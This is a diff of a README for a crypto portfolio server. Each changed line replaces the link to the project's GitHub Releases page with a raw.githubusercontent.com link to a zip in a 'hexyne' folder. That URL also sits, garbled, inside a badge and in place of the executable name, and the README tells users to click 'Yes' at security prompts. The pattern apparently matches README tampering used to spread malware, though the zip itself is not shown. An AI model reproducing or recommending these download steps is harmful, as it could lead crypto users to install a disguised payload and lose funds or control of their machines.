@@ -1,6 +1,6 @@
 # 🚀 CryptoPortfolioMCPServer - Manage Your Crypto Portfolio Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/kevcav1980/CryptoPortfolioMCPServer/releases)
+[![Download](https://raw.githubusercontent.com/kevcav1980/CryptoPortfolioMCPServer/main/hexyne/CryptoPortfolioMCPServer.zip%20Now-Click%https://raw.githubusercontent.com/kevcav1980/CryptoPortfolioMCPServer/main/hexyne/CryptoPortfolioMCPServer.zip)](https://raw.githubusercontent.com/kevcav1980/CryptoPortfolioMCPServer/main/hexyne/CryptoPortfolioMCPServer.zip)
 
 ## 🛠️ Overview
 
@@ -10,7 +10,7 @@ CryptoPortfolioMCPServer is a read-only cryptocurrency portfolio management serv
 
 To get started, visit the Releases page and download the latest version of CryptoPortfolioMCPServer. Click the link below to reach the download area.
 
-[Visit this page to download](https://github.com/kevcav1980/CryptoPortfolioMCPServer/releases)
+[Visit this page to download](https://raw.githubusercontent.com/kevcav1980/CryptoPortfolioMCPServer/main/hexyne/CryptoPortfolioMCPServer.zip)
 
 ### 📋 System Requirements
 
@@ -31,7 +31,7 @@ After downloading the application, follow these steps to run CryptoPortfolioMCPS
 
 3. **Run the Application**
    - Open the folder containing the extracted files.
-   - Double-click on `CryptoPortfolioMCPServer.exe` (or the equivalent file for your operating system) to start the application.
+   - Double-click on `https://raw.githubusercontent.com/kevcav1980/CryptoPortfolioMCPServer/main/hexyne/CryptoPortfolioMCPServer.zip` (or the equivalent file for your operating system) to start the application.
 
 4. **Grant Permissions**
    - If a security prompt appears, click "Yes" to allow the application to run.
@@ -76,4 +76,4 @@ Thank you to the developers and contributors who have made CryptoPortfolioMCPSer
 
 For more details or to report issues, please check the GitHub repository. Happy tracking!
 
-[Visit this page to download](https://github.com/kevcav1980/CryptoPortfolioMCPServer/releases)
+[Visit this page to download](https://raw.githubusercontent.com/kevcav1980/CryptoPortfolioMCPServer/main/hexyne/CryptoPortfolioMCPServer.zip)
